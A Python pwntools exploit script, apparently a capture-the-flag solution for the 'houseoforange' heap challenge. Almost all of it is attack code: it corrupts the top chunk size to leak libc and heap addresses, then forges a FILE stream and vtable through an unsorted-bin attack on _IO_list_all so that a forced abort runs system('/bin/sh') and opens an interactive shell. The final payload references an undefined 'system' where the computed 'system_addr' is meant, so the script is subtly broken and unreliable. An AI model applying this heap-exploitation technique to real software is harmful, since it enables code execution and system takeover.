from pwn import *
import time, sys


run_argv = []
# local process envirnoment
LOCAL = True
elf_name = "./houseoforange"

#retmote args
remote_host = "127.0.0.1"
remote_port = 22333

elf = ELF(elf_name)
#context.clear(arch="i386")
context.clear(arch="amd64")

if LOCAL:
    context.log_level = "debug"
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    top_chunk_off = 0x3C5188
    io_list_all_off = 0x3C5520
    system_off = 0x45390
    io = process(elf_name, env=mine_env)
else:
    io = remote(remote_host, remote_port)

def dlysend_int(index):
    io.send(str(index))
    time.sleep(0.05)

def dlysend_str(mstring):
    io.send(mstring)
    time.sleep(0.05)

def mmenu(opts):
    io.recvuntil("Your choice : ")
    dlysend_int(opts)

def build(len_name, name, price, color):
    mmenu(1)
    io.recvuntil("Length of name :")
    dlysend_int(len_name)
    io.recvuntil("Name :")
    dlysend_str(name)
    io.recvuntil("Price of Orange:")
    dlysend_int(price)
    io.recvuntil("Color of Orange:")
    dlysend_int(color)

def msee():
    mmenu(2)

def update(len_name, name, price, color):
    mmenu(3)
    io.recvuntil("Length of name :")
    dlysend_int(len_name)
    io.recvuntil("Name:")
    dlysend_str(name)
    io.recvuntil("Price of Orange: ")
    dlysend_int(price)
    io.recvuntil("Color of Orange: ")
    dlysend_int(color)

def mgive_up():
    mmenu(4)


def s_leak():
    # overwrite top chunk size
    build(0x40, 'a'*0x40, 0xff, 0xDDAA)

    payload = 'b'*0x48 + p64(0x21)
    payload += p32(0xcc) + p32(0xDDAA) + p64(0)*2
    payload += p64(0xf71)           # top chunk size
    update(0x100, payload, 0xcc, 0xDDAA)

    pause()

    #0x7f57c03c7188-0x7F57C0002000
    # alloc for new chunk trigger init_free
    build(0x1000, 'c'*0x700, 0xf80, 0xDDAA)
    pause()
    build(0x400, 'c'*0x8, 0xf80, 0xDDAA)
    msee()
    io.recvuntil("Name of house : ")
    data = io.recvline()[8:];
    chk_addr = u64(data[:-1].ljust(8, chr(0)))
    log.info("chk_addr: "+hex(chk_addr))
    lk_libc_addr = chk_addr - top_chunk_off
    log.info("lk_libc_addr: "+hex(lk_libc_addr))
    io.recvuntil("Price of orange : ")

    # leak heap address
    update(0x400, "c"*16, 0xcc, 1)
    msee()
    io.recvuntil("Name of house : ")
    data = io.recvline()[16:];
    heap_addr = u64(data[:-1].ljust(8, chr(0)))
    log.info("heap_addr: "+hex(heap_addr))
    io.recvuntil("Price of orange : ")

    return {"lk_libc_addr": lk_libc_addr, "heap_addr": heap_addr}

def s_exp():
    lk_data = s_leak()
    libc_addr = lk_data["lk_libc_addr"]
    heap_addr = lk_data["heap_addr"]
    io_list_all = libc_addr + io_list_all_off
    system_addr = libc_addr + system_off
    vtable_addr = heap_addr + 0x728-0xd0

    payload = "b"*0x410
    payload += p32(0xdada) + p32(0x20) + p64(0)
    stream = "/bin/sh\x00" + p64(0x61) # fake file stream
    stream += p64(0xddaa) + p64(io_list_all-0x10) # Unsortbin attack
    stream = stream.ljust(0xa0,"\x00")
    stream += p64(heap_addr+0x700-0xd0)
    stream = stream.ljust(0xc0,"\x00")
    stream += p64(1)
    payload += stream
    payload += p64(0)
    payload += p64(0)
    payload += p64(vtable_addr)
    payload += p64(1)
    payload += p64(2)
    payload += p64(3)
    payload += p64(0)*3 # vtable
    payload += p64(system)

    update(0x800, payload, 0xcc, 3)
    io.recvuntil(":")
    io.sendline("1") # trigger malloc and abort
    io.interactive()

if __name__ == "__main__":
    pause()
    s_exp()
    pause()
